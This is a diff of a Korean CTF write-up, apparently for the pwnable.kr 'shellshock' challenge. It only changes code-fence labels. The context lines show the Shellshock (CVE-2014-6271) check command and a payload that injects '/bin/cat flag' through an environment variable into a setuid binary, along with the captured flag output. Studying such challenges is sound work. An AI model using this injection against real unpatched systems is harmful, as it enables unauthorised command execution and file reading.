@@ -12,7 +12,7 @@ markup: mmark
 
 1점 문제.
 
-```sh
+```console
 $ ls -l
 total 960
 -r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
@@ -44,7 +44,7 @@ shellshock 취약점은 아래 명령어로 체크할 수 있다.
 env x='() { :;}; echo pwnable!' bash -c 'echo safe~'
 ```
 
-```sh
+```console
 $ env x='() { :;}; echo pwnable!' bash -c 'echo safe~'
 safe~
 $ env x='() { :;}; echo pwnable!' ./bash -c 'echo safe~'
@@ -60,7 +60,7 @@ shellshock 프로그램에도 적용해보자.
 env x='() { :;}; /bin/cat flag' ./shellshock
 ```
 
-```sh
+```console
 $ env x='() { :;}; /bin/cat flag' ./shellshock
 only if I knew CVE-2014-6271 ten years ago..!!
 Segmentation fault
